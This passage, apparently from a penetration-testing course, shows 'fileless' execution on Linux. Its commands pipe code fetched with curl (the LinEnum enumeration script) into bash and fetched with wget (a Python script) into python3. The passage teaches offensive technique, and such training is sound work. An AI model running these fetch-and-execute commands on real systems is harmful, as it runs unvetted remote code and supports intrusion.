Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

#### Fileless Download with cURL

Fileless Download with cURL

```shell-session
glack@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

#### Fileless Download with wget

Fileless Download with wget

```shell-session
glack@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
